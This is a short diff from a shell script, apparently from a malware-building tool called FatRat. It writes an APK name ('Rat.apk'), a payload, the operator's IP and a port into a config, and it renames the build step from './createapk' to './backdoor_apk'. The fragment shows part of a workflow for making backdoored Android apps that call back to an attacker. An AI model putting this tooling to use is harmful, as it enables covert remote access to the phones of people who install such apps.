@@ -954,7 +954,7 @@ echo "Rat.apk" >> $apkconfig
 echo $payload >> $apkconfig
 echo $yourip >> $apkconfig
 echo $yourport >> $apkconfig
-./createapk
+./backdoor_apk
 echo ""
 sleep 2
    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
